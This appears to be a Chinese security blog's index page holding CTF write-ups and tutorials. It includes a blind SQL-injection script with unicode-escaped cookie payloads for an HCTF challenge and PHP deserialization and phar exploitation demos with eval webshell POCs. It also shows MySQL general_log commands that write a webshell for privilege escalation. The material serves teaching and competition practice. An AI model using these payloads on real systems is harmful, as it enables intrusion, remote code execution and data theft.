<h3 id="admin目录"><a href="#admin目录" class="headerlink" title="admin目录"></a>admin目录</h3><p>admin目录下是钓鱼后台的管理,login逻辑判断登陆</p>
<h3 id="include目录。"><a href="#include目录。" class="headerlink" title="include目录。"></a>include目录。</h3><p>include下是配置文件，common入口文件包含了过滤和验证内容，其中:</p>
<ol>
<li>safe.php写了过滤规则，任何GET\POST\COOKIE请求的参数会经过filter<pre><code>function waf($string)
{
 $blacklist = &#39;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&#39;; // and updatexml(1,concat(0x7e,database())
 return preg_replace_callback($blacklist, function ($match) {
     return &#39;@&#39; . $match[0] . &#39;@&#39;;
 }, $string);
}
</code></pre></li>
</ol>
<p>function safe($string)<br>{<br>    if (is_array($string)) {<br>        foreach ($string as $key =&gt; $val) {<br>            $string[$key] = safe($val);<br>        }<br>    } else {<br>        $string = waf($string);<br>    }<br>    return $string;<br>}</p>
<pre><code>匹配到这些会在关键字前后添加@

2. member根据cookie判断是否已经登陆
3. founction封装了一些功能函数
4. db.class一些执行的sql语句

## 思路
### ip
刚开始审的时候看到了insert把ip入库，而且ip的获取是这样的：
![](https://i.loli.net/2018/11/13/5beac380388eb.jpg)
不用经过safe的过滤，但是下面的ip2long会把超限度的ip置空，因此ip注入行不通

### bypass
因为有全局过滤safe，所以一开始在想可不可以bypass掉，用hex绕过is_number的检测，使我们注入的语句不会经过filter。确实成功执行了我用hex传入的语句，但是mysql仅仅是把hex的值入库了，也无法进行二次利用。

### member.php
当时他们说可以用json形式的cookie注入,unicode编码绕过于是去看cookie逻辑登陆的地方

![](https://i.loli.net/2018/11/13/5beac35ebedb4.png)

cookie传入参数login_data解析查库，用了json_decode，那么就可以用unicode编码无视过滤
![](https://i.loli.net/2018/11/13/5beac38e39abe.png)

剩下的就是编写tamper脚本了，把payload替换成unicode。但是看到了微笑师傅的一个py脚本，不借助sqlmap，觉得写的很好，贴出来</code></pre><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>import requests<br>import string</p>
<p>url = ‘<a href="http://kzone.2018.hctf.io/include/common.php&#39;" target="_blank" rel="noopener">http://kzone.2018.hctf.io/include/common.php&#39;</a><br>str1 = string.ascii_letters+string.digits+’{}!@#$*&amp;_,’</p>
<p>def check(payload):<br>    cookie={<br>        ‘PHPSESSID’:’8ehnp28ccr4ueh3gnfc3uqtau1’,<br>        ‘islogin’:’1’,<br>        ‘login_data’:payload<br>    }<br>    try:<br>        requests.get(url,cookies=cookie,timeout=3)<br>        return 0<br>    except:<br>        return 1</p>
<p>result=’’<br>for i in range(1,33):<br>    for j in str1:<br>        payload = ‘{“admin_user”:”admin&#39;/<strong>/and/</strong>/\u0069f(\u0061scii(\u0073ubstr((select/<strong>/table_name/</strong>/from/<strong>/inf\u006Frmation_schema.tables/</strong>/where/<strong>/table_schema\u003ddatabase()/</strong>/limit/<strong>/0,1),%s,1))\u003d&#39;%s&#39;,\u0073leep(4),1)/</strong>/and/<strong>/&#39;1”}’% (str(i),ord(j))<br>        payload = ‘{“admin_user”:”admin&#39;/</strong>/and/<strong>/\u0069f(\u0061scii(\u0073ubstr((select/</strong>/F1a9/<strong>/from/</strong>/F1444g),%s,1))\u003d%s,\u0073leep(4),1)/<strong>/and/</strong>/&#39;1”,”admin_pass”:”123”}’% (str(i),ord(j))<br>        #print(‘[+]’+payload)<br>        if check(payload):<br>            result += j<br>            break<br>    print(result)</p>
<pre><code>
只要是请求的页面包含common.php此脚本都能行得通，因为会引入member.php




</code></pre>
                
            </div>
            <div class="continue">
            <a href="/2018/11/13/HCTF题解/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/10/22/ISCC2018 信阳杯线下赛小结/"> 
                    ISCC2018 信阳杯线下赛小结 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-10-22   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
            </div>
            <div class="content">
                
                <p>自己巨大的锅..感觉本能拿第一的，却只水了个第二。</p>
<p>从这篇起以后的日子闭关反思</p>
<h2 id="线下ctf"><a href="#线下ctf" class="headerlink" title="线下ctf"></a>线下ctf</h2><p>上午的线下ctf就不说了,一个misc两个逆向。web狗：？？？<br>而且misc巨坑，感觉也是比脑洞，b32出来了对比hex还原再crc32。当时B32解出来有乱码，一直在测试编码的道路上，但结束后问了西工的师傅们才发现路走偏了。要学会习惯用winhex分析，跟原始的zip比对….这就解释了为什么有个504的文件头了..总之ctf体验极差</p>
<h2 id="高地赛"><a href="#高地赛" class="headerlink" title="高地赛"></a>高地赛</h2><p>当时拿到题目是两个私地，一个pwn，一个web.高地也是一个pwn<br>看到网上有这么个吐槽：<br>选手：“ISCC你又出新题啦！”</p>
<p>当时看到题,第一反应是17年的原题,ez的前端太好辨识了..<br>最扯淡的是，给了Mongodb的配置和17年的也一样..甚至连后台账号密码都没变。不过一开始我万能密码也进去了。但自己菜的也是真实，作为第一个打全场的队伍，后来权限没稳住又被别人反超…</p>
<p>Always onload，还有很多要学的</p>

                
            </div>
            <div class="continue">
            <a href="/2018/10/22/ISCC2018 信阳杯线下赛小结/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/09/13/四个实例递进php反序列化/"> 
                    四个实例递进php反序列化 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-09-13   
                </a>
                
                
                
                    
            </div>
            <div class="content">
                
                <p>##声明<br>文章首发于安全客：<a href="https://www.anquanke.com/post/id/159206" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159206</a></p>
<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>最近在总结php序列化相关的知识，看了好多前辈师傅的文章，决定对四个理解难度递进的序列化思路进行一个复现剖析。包括最近Blackhat议题披露的phar拓展php反序列化漏洞攻击面。前人栽树，后人乘凉，担着前辈师傅们的辅拓前行！</p>
<h2 id="D0g3"><a href="#D0g3" class="headerlink" title="D0g3"></a>D0g3</h2><p>为了让大家进入状态，来一道简单的反序列化小题，新来的表哥们可以先学习一下php序列化和反序列化。顺便安利一下D0g3小组的平台，后面会有题不断上新哦~<br>题目平台地址：<a href="http://ctf.d0g3.cn" target="_blank" rel="noopener">http://ctf.d0g3.cn</a><br>题目入口：<a href="http://120.79.33.253:9001" target="_blank" rel="noopener">http://120.79.33.253:9001</a></p>
<p>页面给了源码</p>
<pre><code>&lt;?php
error_reporting(0);
include &quot;flag.php&quot;;
$KEY = &quot;D0g3!!!&quot;;
$str = $_GET[&#39;str&#39;];
if (unserialize($str) === &quot;$KEY&quot;)
{
    echo &quot;$flag&quot;;
}
show_source(__FILE__);</code></pre><p>提醒大家补充php序列化知识的水题~</p>
<p>直接上传<code>s:7:&quot;D0g3!!!&quot;</code>即可get flag</p>
<h2 id="绕过魔法函数的反序列化漏洞"><a href="#绕过魔法函数的反序列化漏洞" class="headerlink" title="绕过魔法函数的反序列化漏洞"></a>绕过魔法函数的反序列化漏洞</h2><p>漏洞编号CVE-2016-7124</p>
<h3 id="魔法函数-sleep-和-wakeup"><a href="#魔法函数-sleep-和-wakeup" class="headerlink" title="魔法函数__sleep() 和 __wakeup()"></a>魔法函数__sleep() 和 __wakeup()</h3><p><strong>php文档中定义__wakeup():</strong></p>
<p>unserialize() 执行时会检查是否存在一个 <strong>wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</strong>wakeup()经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。__sleep()则相反，是用在序列化一个对象时被调用</p>
<p><img src="https://i.loli.net/2018/09/06/5b90f6d1d8152.png" alt></p>
<h3 id="漏洞剖析"><a href="#漏洞剖析" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h3><p>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10<br>PHP官方给了示例：<a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=72663</a><br>这个漏洞核心：<strong>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong>比如下面这个类构造：</p>
<pre><code>class hpdoger{
    public $a = &#39;nice to meet u&#39;;
    }</code></pre><p>序列化这个类得到的结果：</p>
<pre><code>O:7:&quot;hpdoger&quot;:1:{s:1:&quot;a&quot;;s:6:&quot;nice to meet u&quot;;}</code></pre><p>简单解释一下这个序列化字符串：<br>O代表结构类型为：类，7表示类名长度，接着是类名、属性（成员）个数<br>大括号内分别是：属性名类型、长度、名称；值类型、长度、值</p>
<p>正常情况下，反序列化一个类得到的结果：<br><img src="https://i.loli.net/2018/09/06/5b90f7f9ae0d0.jpg" alt></p>
<p>析构方法和__wakeup都能够执行</p>
<p>如果我们把传入的序列化字符串的属性个数更改成大于1的任何数</p>
<pre><code>O:7:&quot;hpdoger&quot;:2:{s:1:&quot;a&quot;;s:6:&quot;u know&quot;;}</code></pre><p>得到的结果如图，__wakeup没有被执行，但是执行了析构函数<br><img src="https://i.loli.net/2018/09/06/5b90f8ecc8319.png" alt></p>
<p>假如我们的demo是这样的呢?</p>
<pre><code>&lt;?php
class A{
    var $a = &quot;test&quot;;
    function __destruct(){
        $fp = fopen(&quot;D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php&quot;,&quot;w&quot;);
        fputs($fp,$this-&gt;a);
        fclose($fp);
    }
    function __wakeup()
        {
            foreach(get_object_vars($this) as $k =&gt; $v) {
                    $this-&gt;$k = null;
            }
        }
}
$hpdoger = $_POST[&#39;hpdoger&#39;];
$clan = unserialize($hpdoger);
?&gt;</code></pre><p>每次反序列化是都会调用__wakeup从而把$a值清空。但是，如果我们绕过wakeup不就能写Shell了？既然反序列化的内容是可控的，就利用上述的方法绕过wakeup。</p>
<p>poc:</p>
<pre><code>O:1:&quot;A&quot;:2:{s:1:&quot;a&quot;;s:27:&quot;&lt;?php eval($_POST[&quot;hp&quot;]);?&gt;&quot;;}</code></pre><h3 id="序列化漏洞常见的魔法函数"><a href="#序列化漏洞常见的魔法函数" class="headerlink" title="序列化漏洞常见的魔法函数"></a>序列化漏洞常见的魔法函数</h3><p>__construct():当一个类被创建时自动调用<br>__destruct():当一个类被销毁时自动调用<br>__invoke():当把一个类当作函数使用时自动调用<br>__tostring():当把一个类当作字符串使用时自动调用<br>__wakeup():当调用unserialize()函数时自动调用<br>__sleep():当调用serialize()函数时自动调用<br>__call():当要调用的方法不存在或权限不足时自动调用</p>
<h2 id="Session反序列化漏洞"><a href="#Session反序列化漏洞" class="headerlink" title="Session反序列化漏洞"></a>Session反序列化漏洞</h2><h3 id="Session序列化机制"><a href="#Session序列化机制" class="headerlink" title="Session序列化机制"></a>Session序列化机制</h3><p>提到这个漏洞，就得先知道什么叫Session序列化机制。</p>
<p>当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为/tmp）。</p>
<p>PHP处理器的三种序列化方式：<br>| 处理器         | 对应的存储格式    |<br>| —————— |:———————|<br>| php_binary      | 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值 |<br>| php           | 键名＋竖线＋经过serialize()函数反序列处理的值   |<br>|php_serialize |serialize()函数反序列处理数组方式|</p>
<p>配置文件php.ini中含有这几个与session存储配置相关的配置项：</p>
<pre><code>session.save_path=&quot;&quot;   --设置session的存储路径,默认在/tmp
session.auto_start   --指定会话模块是否在请求开始时启动一个会话,默认为0不启动
session.serialize_handler   --定义用来序列化/反序列化的处理器名字。默认使用php</code></pre><p>一个简单的demo(session.php)认识一下存储过程：</p>
<pre><code>&lt;?php
ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);
session_start();

$_SESSION[&#39;hpdoger&#39;] = $_GET[&#39;hpdoger&#39;];

?&gt;</code></pre><p>访问页面</p>
<pre><code>http://localhost/test/session.php?hpdoger=lover</code></pre><p>在session.save_path对应路径下会生成一个文件，名称例如:sess_1ja9n59ssk975tff3r0b2sojd5<br>因为选择的序列化处理方式为php_serialize,所以是被serialize()函数处理过的$_SESSION[‘hpdoger’]。存储文件内容：</p>
<pre><code>a:1:{s:7:&quot;hpdoger&quot;;s:5:&quot;lover&quot;;}</code></pre><p>如果选择的序列化处理方式为php，即<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);</code>,则存储内容为：</p>
<pre><code>hpdoger|s:5:&quot;lover&quot;;</code></pre><h3 id="漏洞剖析-1"><a href="#漏洞剖析-1" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h3><p>选择的处理方式不同，序列化和反序列化的方式亦不同。如果网站序列化并存储Session与反序列化并读取Session的方式不同，就可能导致漏洞的产生。</p>
<p>这里提供一个demo：</p>
<p>存储Session页面</p>
<pre><code>/*session.php*/

&lt;?php
ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);
session_start();

$_SESSION[&#39;hpdoger&#39;] = $_GET[&#39;hpdoger&#39;];

?&gt;</code></pre><p>可利用页面</p>
<pre><code>/*test.php*/

&lt;?php 
ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);
session_start();

class hpdoger{
    var $a;

    function __destruct(){
        $fp = fopen(&quot;D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php&quot;,&quot;w&quot;);
        fputs($fp,$this-&gt;a);
        fclose($fp);
    }
}

?&gt;</code></pre><p>访问第一个页面的poc:<br><img src="https://i.loli.net/2018/09/06/5b90f6078e2c6.png" alt></p>
<p>/tmp目录下生成的session文件内容：</p>
<pre><code>a:1:{s:7:&quot;hpdoger&quot;;s:52:&quot;|O:7:&quot;hpdoger&quot;:1:{s:1:&quot;a&quot;;s:17:&quot;&lt;?php phpinfo()?&gt;&quot;;}&quot;;}</code></pre><p>再访问test.php时反序列化已存储的session，新的php处理方式会把“|”后的值当作KEY值再serialize()，相当于我们实例化了这个页面的hpdoger类，相当于执行:</p>
<pre><code>$_SESSION[&#39;hpdoger&#39;] = new hpdoger();
$_SESSION[&#39;hpdoger&#39;]-&gt;a = &#39;&lt;?php phpinfo()?&gt;&#39;;</code></pre><p>在指定的目录D:\phpStudy\PHPTutorial\WWW\test\shell.php中会写入内容<code>&lt;?php phpinfo()?&gt;</code><br><img src="https://i.loli.net/2018/09/06/5b90f607d6b3a.jpg" alt></p>
<h3 id="jarvisoj-web的一道SESSION反序列化"><a href="#jarvisoj-web的一道SESSION反序列化" class="headerlink" title="jarvisoj-web的一道SESSION反序列化"></a>jarvisoj-web的一道SESSION反序列化</h3><p>题目入口(<a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a>)<br>Index页给源码：</p>
<pre><code>&lt;?php
//A webshell is wait for you
ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this-&gt;mdzz = &#39;phpinfo();&#39;;
    }

    function __destruct()
    {
        eval($this-&gt;mdzz);
    }
}
if(isset($_GET[&#39;phpinfo&#39;]))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents(&#39;index.php&#39;));
}
?&gt;</code></pre><p>看到ini_set(‘session.serialize_handler’, ‘php’);</p>
<p>暂时没找到用php_serialize添加session的方法。但看到当get传入phpinfo时会实例化OowoO这个类并访问phpinfo()<br><img src="https://i.loli.net/2018/09/07/5b927fb850e32.png" alt></p>
<p>这里参考Chybeta师傅的一个姿势：session.upload_progress.enabled为On。session.upload_progress.enabled本身作用不大，是用来检测一个文件上传的进度。但当一个文件上传时，同时POST一个与php.ini中session.upload_progress.name同名的变量时（session.upload_progress.name的变量值默认为PHP_SESSION_UPLOAD_PROGRESS），PHP检测到这种同名请求会在$_SESSION中添加一条数据。我们由此来设置session。</p>
<p>构造上传的表单poc，列出当前目录:</p>
<pre><code>&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:26:&quot;print_r(scandir(__dir__));&quot;;}&quot; /&gt;
    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
    &lt;input type=&quot;submit&quot; /&gt;
&lt;/form&gt;</code></pre><p>通过phpinfo页面查看当前路径<code>_SERVER[&quot;SCRIPT_FILENAME&quot;]</code><br><img src="https://i.loli.net/2018/09/07/5b927fb844eb0.png" alt></p>
<p>读文件就行</p>
<pre><code>|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));&quot;;}</code></pre><p>得到flag</p>
<pre><code>CTF{4d96e37f4be998c50aa586de4ada354a}</code></pre><h2 id="phar伪协议触发php反序列化"><a href="#phar伪协议触发php反序列化" class="headerlink" title="phar伪协议触发php反序列化"></a>phar伪协议触发php反序列化</h2><p>最近Black Hat比较热的一个议题：It’s a PHP unserialization vulnerability Jim, but not as we know it。参考了创宇的文章，这里笔者把它作为php反序列化的最后一个模块，希望日后能在以上的几种反序列化之外拓宽新的思路。</p>
<h3 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h3><p>可以将多个文件归入一个本地文件夹，也可以包含一个文件</p>
<h3 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a>phar文件</h3><p>PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。所有PHAR文件都使用.phar作为文件扩展名，PHAR格式的归档需要使用自己写的PHP代码。</p>
<h3 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h3><p>详情参考php手册(<a href="https://secure.php.net/phar" target="_blank" rel="noopener">https://secure.php.net/phar</a>)</p>
<p>这里摘出创宇提供的四部分结构概要：<br>1、a stub<br>识别phar拓展的标识，格式:xxx<?php xxx; __HALT_COMPILER();?>。对应的函数Phar::setStub</p>
<p>2、a manifest describing the contents<br>被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用的核心部分。对应函数Phar::setMetadata–设置phar归档元数据</p>
<p>3、 the file contents<br>被压缩文件的内容。</p>
<p>4、[optional] a signature for verifying Phar integrity (phar file format only)<br>签名，放在文件末尾。对应函数Phar :: stopBuffering –停止缓冲对Phar存档的写入请求，并将更改保存到磁盘</p>
<h3 id="Phar内置方法"><a href="#Phar内置方法" class="headerlink" title="Phar内置方法"></a>Phar内置方法</h3><p>要想使用Phar类里的方法，必须将phar.readonly配置项配置为0或Off（文档中定义）</p>
<p>PHP内置phar类，其他的一些方法如下：</p>
<pre><code>$phar = new Phar(&#39;phar/hpdoger.phar&#39;); //实例一个phar对象供后续操作
$phar-&gt;startBuffering()  //开始缓冲Phar写操作
$phar-&gt;addFromString(&#39;test.php&#39;,&#39;&lt;?php echo \&#39;this is test file\&#39;;&#39;); //以字符串的形式添加一个文件到 phar 档案
$phar-&gt;buildFromDirectory(&#39;fileTophar&#39;) //把一个目录下的文件归档到phar档案
$phar-&gt;extractTo()  //解压一个phar包的函数，extractTo 提取phar文档内容</code></pre><h3 id="漏洞剖析-2"><a href="#漏洞剖析-2" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h3><p>文件的第二部分a manifest describing the contents可知，phar文件会以序列化的形式存储用户自定义的meta-data，在一些<strong>文件操作函数</strong>执行的参数可控，参数部分我们利用Phar伪协议，可以不依赖unserialize()直接进行反序列化操作，在读取phar文件里的数据时反序列化meta-data，达到我们的操控目的。</p>
<p>而在一些上传点，我们可以更改phar的文件头并且修改其后缀名绕过检测，如：test.gif，里面的meta-data却是我们提前写入的恶意代码，而且可利用的<strong>文件操作函数</strong>又很多，所以这是一种不错的绕过+执行的方法。</p>
<h3 id="文件上传绕过deomo"><a href="#文件上传绕过deomo" class="headerlink" title="文件上传绕过deomo"></a>文件上传绕过deomo</h3><p>自己写了个丑陋的代码，只允许gif文件上传（实则有其他方法绕过，这里不赘述），代码部分如下</p>
<p><strong>前端上传：</strong></p>
<pre><code>&lt;form action=&quot;http://localhost/test/upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;input type=&quot;file&quot; name=&quot;hpdoger&quot;&gt;
    &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;
&lt;/form&gt;</code></pre><p><strong>后端验证：</strong></p>
<pre><code>/*upload.php*/
&lt;?php
    /*返回后缀名函数*/
    function getExt($filename){
        return substr($filename,strripos($filename,&#39;.&#39;)+1);
    }

    /*检测MIME类型是否为gif*/
    if($_FILES[&#39;hpdoger&#39;][&#39;type&#39;] != &quot;image/gif&quot;){
        echo &quot;Not allowed !&quot;;
        exit;
    }
    else{
        $filenameExt = strtolower(getExt($_FILES[&#39;hpdoger&#39;][&#39;name&#39;]));    /*提取后缀名*/

        if($filenameExt != &#39;gif&#39;){
            echo &quot;Not gif !&quot;;
        }
        else{
            move_uploaded_file($_FILES[&#39;hpdoger&#39;][&#39;tmp_name&#39;], $_FILES[&#39;hpdoger&#39;][&#39;name&#39;]);
            echo &quot;Successfully！&quot;;
        }
    }
?&gt;</code></pre><p>代码判断了MIME类型+后缀判断，如下是我测试php文件的两个结果：<br>直接上传php<br><img src="https://i.loli.net/2018/09/07/5b9280161ed92.png" alt></p>
<p>抓包更改content-type为 image/gif再次上传<br><img src="https://i.loli.net/2018/09/07/5b9280606915f.png" alt><br><img src="https://i.loli.net/2018/09/07/5b9280606784b.png" alt></p>
<p>可以看到两次都被拒绝上传,那我们更改phar后缀名再次上传</p>
<p>php环境编译生成一个phar文件，代码如下：</p>
<pre><code>&lt;?php 
class not_useful{
    var $file = &quot;&lt;?php phpinfo() ?&gt;&quot;;
}

@unlink(&quot;hpdoger.phar&quot;);
$test = new not_useful();
$phar = new Phar(&quot;hpdoger.phar&quot;);

$phar-&gt;startBuffering();
$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 增加gif文件头
$phar-&gt;setMetadata($test);
$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);

$phar-&gt;stopBuffering();
?&gt;</code></pre><p>这里实例的类是为后面的demo做铺垫，php文件同目录下生成hpdoger.phar文件，我们更改名称为hpdoger.gif看一下<br><img src="https://i.loli.net/2018/09/07/5b92801620631.png" alt></p>
<p>gif头、phar识别序列、序列化后的字符串都具备</p>
<p>上传一下看能否成功,成功绕过检测在服务端存储一个hpdoger.gif<br><img src="https://i.loli.net/2018/09/07/5b92808e8c0bf.png" alt></p>
<h3 id="利用Phar-伪协议demo"><a href="#利用Phar-伪协议demo" class="headerlink" title="利用Phar://伪协议demo"></a>利用Phar://伪协议demo</h3><p>我们已经上传了可解析的phar文件，现在需要找到一个文件操作函数的页面来利用，这里笔者写一个比较鸡肋的页面，目的是还原流程而非真实情况。</p>
<p>代码如下:reapperance.php</p>
<pre><code>&lt;?php
    $recieve = $_GET[&#39;recieve&#39;];

    /*写入文件类操作*/
    class not_useful{
        var $file;

        function __destruct(){
        $fp = fopen(&quot;D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php&quot;,&quot;w&quot;); //自定义写入路径
        fputs($fp,$this-&gt;file);
        fclose($fp);
    }

    file_get_contents($recieve);

?&gt;</code></pre><p>$recieve可控，符合我们的利用条件。那我们构造payload:<br><img src="https://i.loli.net/2018/09/07/5b92808e8a8ae.png" alt></p>
<p>若执行成功，会将刚才写入meta-data数据里面序列化的类进行反序列化，并且实例了$file成员，导致文件写入，成功写入如下：<br><img src="https://i.loli.net/2018/09/07/5b92808e93634.png" alt></p>
<h3 id="可利用的文件操作函数"><a href="#可利用的文件操作函数" class="headerlink" title="可利用的文件操作函数"></a>可利用的文件操作函数</h3><p>fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile、md5_file、filesize</p>
<h3 id="各种文件头"><a href="#各种文件头" class="headerlink" title="各种文件头"></a>各种文件头</h3><table>
<thead>
<tr>
<th>类型</th>
<th>标识</th>
</tr>
</thead>
<tbody><tr>
<td>JPEG</td>
<td>头标识ff d8 ,结束标识ff d9</td>
</tr>
<tr>
<td>PNG</td>
<td>头标识89 50 4E 47 0D 0A 1A 0A</td>
</tr>
<tr>
<td>GIF</td>
<td>头标识(6 bytes) 47 49 46 38 39(37) 61 GIF89(7)a</td>
</tr>
<tr>
<td>BMP</td>
<td>头标识(2 bytes) 42 4D BM</td>
</tr>
</tbody></table>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>jarvisoj-web-writeup(<a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO" target="_blank" rel="noopener">https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO</a>)<br>利用 phar 拓展 php 反序列化漏洞攻击面(<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a>)</p>

                
            </div>
            <div class="continue">
            <a href="/2018/09/13/四个实例递进php反序列化/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/09/08/基于Windows下mysql的一些提权分析/"> 
                    基于Windows下mysql的一些提权分析 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-09-08   
                </a>
                
                
                
                    
            </div>
            <div class="content">
                
                <h1 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h1><p>这篇文章是写基于windows环境下的一些mysql提权方法的分析并利用。这些方法老生常谈，但困于很多文章在讲分析和利用的时候模棱两可，因此想总结一下常见的方法思路。基于windows的提权姿势多的数不胜数，一般在配置文件可以嗅探到root密码的情况（root密码已知）下，或者注入、爆破拿到root密码下，可以考虑mysql提权。文章内容很基础，下面对这些方法进行一些粗谈，有什么理解错误的地方还请客观们轻打…大佬们可以略过这篇文章qaq…</p>
<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>靶机A： Windows 7 SP1<br>靶机B： Windows server 2003 enterprise x64<br>Phpstudy搭建的php+mysql<br>php版本：5.4.45<br>mysql版本：5.5.53<br>攻击环境：已知root账号密码，网站存在phpmyadmin页面</p>
<h1 id="通过phpmyadmin来getshell"><a href="#通过phpmyadmin来getshell" class="headerlink" title="通过phpmyadmin来getshell"></a>通过phpmyadmin来getshell</h1><h2 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h2><p>利用log变量，猜一下绝对路径<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224310-0a604df6-9987-1.png" alt><br>看到phpstudy，猜测根目录在WWW下，into outfile写个马测一下能传不<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224334-18b3e6b0-9987-1.png" alt><br>果然是用不成into outfile，因为file_priv为null，那么尝试使用日志写马</p>
<h2 id="利用日志写shell"><a href="#利用日志写shell" class="headerlink" title="利用日志写shell"></a>利用日志写shell</h2><p>开启日志记录</p>
<pre><code>set global general_log=&#39;on&#39;;</code></pre><p>日志文件导出指定目录</p>
<pre><code>set global general_log_file=&#39;C:/phpstudy/WWW/hp.php&#39;;</code></pre><p>记录sql语句写马，这里我就是演示一下，没有安全狗，直接传原马</p>
<pre><code>select &#39;&lt;?php @eval($_POST[&quot;hp&quot;]); ?&gt;&#39;;</code></pre><p>关闭记录</p>
<pre><code>set global general_log=off;</code></pre><h2 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h2><p>url: 192.168.11.106/hp.php<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224350-22085dea-9987-1.png" alt><br>看一下权限，普通成员hpd0egr，创建用户错误5。<br>接下来开始提权之路！</p>
<h1 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h1><h2 id="什么是UDF"><a href="#什么是UDF" class="headerlink" title="什么是UDF"></a>什么是UDF</h2><p>UDF(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p>
<h2 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h2><p>先学习一下什么叫动态链接库</p>
